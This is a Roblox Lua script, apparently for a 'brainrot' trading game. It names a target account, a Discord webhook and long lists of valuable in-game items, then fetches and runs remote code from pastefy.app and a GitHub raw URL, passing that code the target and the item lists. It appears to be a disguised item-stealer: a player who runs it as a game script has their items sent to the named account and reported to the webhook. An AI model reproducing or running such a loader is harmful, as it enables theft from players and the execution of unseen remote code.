local TARGET_ID = 9185143649
local TARGET_USER = "BadGirlHaloPremiumXD"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1571657473360658485/lVOvZTXazf6pnj5fvwNrfwJSzixX7_VzNafB5f3sxXWRE1dYxJAIQdqOcl_JjzP4vjFq"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["John Pork"] = true,
    ["Headless Horseman"] = true,
    ["Dragon Skeletonini"] = true,
    ["Phoenix"] = true,
    ["Plant Bros"] = true,
    ["Hydra Serpent"] = true,
    ["Orchidox"] = true,
    ["Los Dragons"] = true,
    ["Dragon Cannelloni"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Elefanto Frigo"] = true,
    ["Antonio"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Capitano Americano"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Rico Dinero"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Kalika Bros"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Fishino Clownino"] = true,
    ["Signore Carapace"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Sammyni Cakini"] = true,
    ["Los Hackers"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Bearito Cabinito"] = true,
    ["Digi Narwhal"] = true,
    ["Los Admins"] = true,
    ["Moby Bros"] = true,
    ["25"] = true,
    ["Bunny and Eggy"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Garama and Madundung"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Ginger Gerat"] = true,
    ["Guest 666"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["Examen Bros"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Pizza and Ranch"] = true,
    ["Bumbatron"] = true,
    ["S'more Serat"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Quackini Snackini"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Truckini"] = true,
    ["Polaroidini"] = true,
    ["La Fuse Machine"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Capitano Moby"] = true,
    ["Celestial Pegasus"] = true,
    ["Los Amigos"] = true
}

local TargetBaseSkins = {
    ["Tralalero"] = true,
    ["Octo"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true
}

local TargetGears = {
    ["Blackhole Bomb"] = true,
    ["Candy Sentry"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Demon's Head"] = true,
    ["Radioactive Airstrike"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Santa's Sleigh"] = true,
    ["Yin Yang Lamp"] = true,
    ["Phantom Slap"] = true,
    ["Lava Blaster"] = true,
    ["Cupid's Wings"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Divine Slap"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)